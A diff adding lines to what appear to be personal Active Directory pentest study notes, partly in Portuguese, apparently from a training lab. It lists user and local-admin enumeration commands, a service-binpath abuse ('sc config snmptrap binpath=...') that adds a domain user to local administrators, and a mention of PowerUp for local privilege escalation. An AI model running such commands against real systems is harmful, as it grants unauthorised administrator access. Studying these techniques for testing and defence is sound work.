@@ -17,3 +17,19 @@ pegar os DCs do ambiente -->
 Get-ADDomainController -Filter * | Select-Object HostName
 #+end_src
 
+#+begin_src powershell
+Get-ADUser -Filter *
+#+end_src
+
+pegar users de um grupo especifico, ou simplesmente listar users existentes nos grupos locais -->
+#+begin_src powershell
+net localgroup administrators
+#+end_src
+
+
+#+begin_src powershell
+sc config snmptrap binpath="net localgroup administrators cyberwarfare\employee /add"
+#+end_src
+
+* local priv escalation
+PowerUp can be used to escalate locally in a windows environment
